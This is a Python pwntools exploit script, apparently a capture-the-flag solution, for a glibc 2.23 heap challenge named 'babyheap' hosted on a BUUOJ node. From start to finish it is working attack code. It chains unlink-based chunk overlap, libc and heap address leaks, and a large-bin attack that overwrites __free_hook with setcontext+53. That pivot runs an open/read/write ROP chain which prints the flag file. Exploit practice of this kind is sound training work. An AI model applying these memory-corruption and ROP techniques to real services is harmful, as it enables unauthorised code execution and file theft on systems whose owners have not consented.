import sys
from pwn import *
#context.log_level='debug'
context.arch='amd64'

if len(sys.argv)==1 :
	io=process('./babyheap')
	elf=ELF('./babyheap')
	libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else :
	io=remote('node3.buuoj.cn',26519)
	elf=ELF('./babyheap')
	libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')


def add(a):
	io.sendlineafter("Choice: \n",'1')
	io.sendlineafter("Size: ",str(a))

def edit(a,b):
	io.sendlineafter("Choice: \n",'2')
	io.sendlineafter("Index: ",str(a))
	io.sendafter("Content: ",b)

def delete (a):
	io.sendlineafter("Choice: \n",'3')
	io.sendlineafter("Index: ",str(a))

def show (a):
	io.sendlineafter("Choice: \n",'4')
	io.sendlineafter("Index: ",str(a))

add(0x28)	#0
add(0x18)	#1
add(0xf8)	#2
add(0x28)	#3

add(0x68)	#4
add(0x488)  #5
add(0xf8)	#6

add(0x68)  	#7
add(0x488)  #8
add(0xf8)	#9
add(0x78)	#10
add(0x200)	#11

delete(0)	#-0
edit(1,'a'*0x10+p64(0x50))
delete(2)	#-2     unlink 0 1 2
add(0x28)	#0
show(1)
libc_base=u64(io.recv(6)+'\x00\x00')-0x3c4b20-88
#libc.address=libc_base
success('libc_base:'+hex(libc_base))
add(0x28)	#2
add(0x28)	#12
add(0x28)	#13
add(0x88)	#14
delete(13)
delete(2)
show(1)
heap_base=u64(io.recv(6)+'\x00\x00')-0x90
success('heap_base:'+hex(heap_base))
add(0x28)   #2
add(0x28)	#12
add(0x118)	#2
delete(4)	#-4
edit(5,'a'*0x480+p64(0x500))
delete(6)	#-6     unlink 4 5 6 
add(0x5f8)  #4
pay='\x00'*0x68+p64(0x4f1)+'\x00'*0x4e8
pay+=p64(0xa1)
edit(4,pay)
delete(5)	#-5

delete(7)	#-7
edit(8,'a'*0x480+p64(0x500))
delete(9)	#-9     unlink 7 8 9 
add(0x5f8)  #5
pay='\x00'*0x68+p64(0x501)+'\x00'*0x4f8
pay+=p64(0x91)
edit(5,pay)
delete(8)

free_hook_addr=libc_base+libc.sym['__free_hook']
success('free_hook_addr:'+hex(free_hook_addr))
fake_chunk_addr=free_hook_addr-0x20

pay='\x00'*0x68+p64(0x4f1)+p64(0)+p64(fake_chunk_addr)
edit(5,pay)
layout=[
'\x00'*0x68,
p64(0x4d1),
p64(0),
p64(fake_chunk_addr+8),
p64(0),
p64(fake_chunk_addr-0x18-5)
]
pay=flat(layout)
edit(4,pay)
add(0x48)	#6
ret_addr=libc_base+0x937
pop_rdx_rsi_ret_addr=libc_base+0x1150c9
pop_rdi_ret_addr=libc_base+0x21102
'''
   0x7f85fd8aab75 <setcontext+53>  mov    rsp, QWORD PTR [rdi+0xa0]
   0x7f85fd8aab7c <setcontext+60>  mov    rbx, QWORD PTR [rdi+0x80]
   0x7f85fd8aab83 <setcontext+67>  mov    rbp, QWORD PTR [rdi+0x78]
   0x7f85fd8aab87 <setcontext+71>  mov    r12, QWORD PTR [rdi+0x48]
   0x7f85fd8aab8b <setcontext+75>  mov    r13, QWORD PTR [rdi+0x50]
   0x7f85fd8aab8f <setcontext+79>  mov    r14, QWORD PTR [rdi+0x58]
   0x7f85fd8aab93 <setcontext+83>  mov    r15, QWORD PTR [rdi+0x60]
   0x7f85fd8aab97 <setcontext+87>  mov    rcx, QWORD PTR [rdi+0xa8]
   0x7f85fd8aab9e <setcontext+94>  push   rcx
   0x7f85fd8aab9f <setcontext+95>  mov    rsi, QWORD PTR [rdi+0x70]
   0x7f85fd8aaba3 <setcontext+99>  mov    rdx, QWORD PTR [rdi+0x88]
   0x7f85fd8aabaa <setcontext+106> mov    rcx, QWORD PTR [rdi+0x98]
   0x7f85fd8aabb1 <setcontext+113> mov    r8, QWORD PTR [rdi+0x28]
   0x7f85fd8aabb5 <setcontext+117> mov    r9, QWORD PTR [rdi+0x30]
   0x7f85fd8aabb9 <setcontext+121> mov    rdi,QWORD PTR [rdi+0x68]
   0x7f85fd8aabbd <setcontext+125> xor    eax,eax
   0x7f85fd8aabbf <setcontext+127> ret
'''



pay='./flag'
pay=pay.ljust(0x68,'\x00')	#pading 0x68
pay+=p64(heap_base+0x190)	#rdi  	 rdi+0x68
pay+=p64(0)					#rsi  	 rdi+0x70
pay+='\x00'*0x10 			#pading 0x88
pay+=p64(0)					#rdx  	 rdi+0x88
pay+='\x00'*0x10  			#pading 0xa0
pay+=p64(heap_base+0x290)	#rsp  	 rdi+0xa0
pay+=p64(libc_base+libc.sym['open'])	#rip		rdi+0xa8
pay=pay.ljust(0x100,'\x00')
pay+=p64(pop_rdi_ret_addr)
pay+=p64(3)
pay+=p64(pop_rdx_rsi_ret_addr)
pay+=p64(0x100)
pay+=p64(heap_base+0x390)
pay+=p64(libc_base+libc.sym['read'])
pay+=p64(pop_rdi_ret_addr)
pay+=p64(1)
pay+=p64(pop_rdx_rsi_ret_addr)
pay+=p64(0x100)
pay+=p64(heap_base+0x390)
pay+=p64(libc_base+libc.sym['write'])
edit(4,pay)
edit(6,'\x00'*0x10+p64(libc_base+libc.sym['setcontext']+53))
delete(4)

#gdb.attach(io)
#pause()


io.interactive()